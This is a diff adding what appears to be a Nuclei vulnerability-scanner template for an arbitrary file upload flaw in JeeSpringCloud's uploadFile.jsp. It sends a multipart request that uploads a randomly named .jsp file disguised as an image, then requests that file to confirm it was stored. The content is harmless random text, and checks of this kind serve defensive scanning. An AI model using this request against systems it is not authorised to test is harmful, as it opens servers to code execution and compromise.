@@ -1,0 +1,62 @@
+id: jeespringcloud-uploadfile-jsp-anyfile-upload
+info:
+  name: JeeSpringCloud uploadFile.jsp Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  filename: "{{rand_base(6)}}"
+  content: "{{rand_base(32)}}"
+  boundary: "{{rand_base(26)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}"
+    body: |
+      ------WebKitFormBoundary{{boundary}}
+      Content-Disposition: form-data; name="fileshare"; filename="{{filename}}.jsp"
+      Content-Type: image/jpeg
+      
+      {{content}}
+      
+      ------WebKitFormBoundary{{boundary}}--
+    extractors:
+      - type: regex
+        name: uploaded_file
+        group: 1
+        regex:
+          - "([0-9]+).jsp\r\n"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "[0-9]+.jsp\r\n"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/static/uploadify/{{uploaded_file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{content}}"
